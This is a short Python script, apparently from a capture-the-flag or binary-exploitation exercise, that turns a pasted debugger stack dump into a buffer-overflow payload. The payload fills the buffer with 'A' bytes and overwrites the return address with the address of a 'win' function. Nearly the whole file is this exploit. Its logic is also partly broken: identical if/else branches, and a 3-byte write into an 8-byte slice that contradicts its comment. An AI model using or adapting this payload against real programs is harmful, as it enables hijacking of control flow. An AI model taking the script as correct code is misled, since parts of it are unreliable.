raw_text = """
0x7fffffffc2a0: 0x0000000000000000      0x0000000000000000
0x7fffffffc2b0: 0x0000000000000000      0x0000000000000000
0x7fffffffc2c0: 0x0000000000000000      0x0000000000000000
0x7fffffffc2d0: 0x0000000000000000      0x0000000000000000
0x7fffffffc2e0: 0x0000000000000000      0x0000000000000000
0x7fffffffc2f0: 0x0000000000000000      0x0000000000000000
0x7fffffffc300: 0x0000000000000000      0x0000000000000000
0x7fffffffc310: 0x000000000000003c      0x000000000041240c
0x7fffffffc320: 0x00007fffffffc358      0x000000000041240c
0x7fffffffc330: 0x00007fffffffc358      0x00007fffffffd8b3
0x7fffffffc340: 0x0000000000000000      0x00000000004013ff
"""

def zero_8_bytes():
    return b"\x00"*8
def A8_bytes():
    return b"A"*8
def hex_string_to_bytes(hex_string:str):
    return int(hex_string,16).to_bytes(8, 'little')


def generate_payload():
    lines = raw_text.strip().splitlines()
    payload = bytearray()
    for line in lines:
        _,letter = line.split(':')
        gbt1, gbt2 = letter.split()
        gbt1 = gbt1.strip()
        gbt2 = gbt2.strip()
        gbt1 = hex_string_to_bytes(gbt1)
        gbt2 = hex_string_to_bytes(gbt2)
        if gbt1 != zero_8_bytes():
            payload += A8_bytes()
        else:
            payload += A8_bytes()
        if gbt2 != zero_8_bytes():
            payload += A8_bytes()
        else:
            payload += A8_bytes()
    payload[-16:-8] = (0x7fffffff0000).to_bytes(8, 'little')  # Overwrite the first 8 bytes with the address of the stack
    payload[-8:] = (0x40204d).to_bytes(3, 'little')  # Overwrite the last 8 bytes with the address of the win function
    print(payload)
    print(len(payload))
    return payload
